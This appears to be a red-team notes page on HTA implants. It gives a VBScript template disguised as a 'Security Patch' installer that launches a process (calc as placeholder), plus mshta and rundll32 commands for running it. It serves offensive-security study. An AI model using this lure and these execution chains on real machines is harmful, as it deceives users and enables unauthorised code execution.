# HTA

HTA implant template.

```html
<html>
	<head>
		<title>
			Security Patch
		</title>
	</head>
	<body>
		<p>Installing security patch...</p>
	</body>
	<script language="VBScript">
	Function Execute()
		Set shell = CreateObject("wscript.Shell")
		shell.run "calc"
	End Function

	Execute
	</script>
</html>
```

## 01 - `mshta.exe`

To execute the implant.

```
C:\> mshta.exe %CD%\implant.hta

C:\> mshta.exe <drive_letter>:\absolute\path\to\implant.hta
```

## 02 - `rundll32.exe`

```
C:\> rundll32.exe ieframe.dll,OpenURL "<drive_letter>:\absolute\path\to\implant.hta"

C:\> rundll32.exe url.dll,OpenURL "<drive_letter>:\absolute\path\to\implant.hta"

C:\> rundll32.exe shdocvw.dll,OpenURL "<drive_letter>:\absolute\path\to\implant.hta"

C:\> rundll32.exe url.dll,OpenURLA "<drive_letter>:\absolute\path\to\implant.hta"
```

---
## References

### Backlinks

- [[07 - Tactics & Techniques & Procedures (TTPs) Phases/C - Initial Access/0x01 - Weaponization/0xC - Client-Side Attacks/Delivery Methods/File Attachment/Web Drive-by/Windows/Manual/Living off the Land]]

### Red Team Notes

- [Red Team Notes: MSHTA](https://www.ired.team/offensive-security/code-execution/t1170-mshta-code-execution)

### Bohops

- [Bohops: Abusing Exported Functions and Exposed DCOM Interfaces for Pass-Thru Command Execution and Lateral Movement](https://bohops.com/2018/03/17/abusing-exported-functions-and-exposed-dcom-interfaces-for-pass-thru-command-execution-and-lateral-movement/)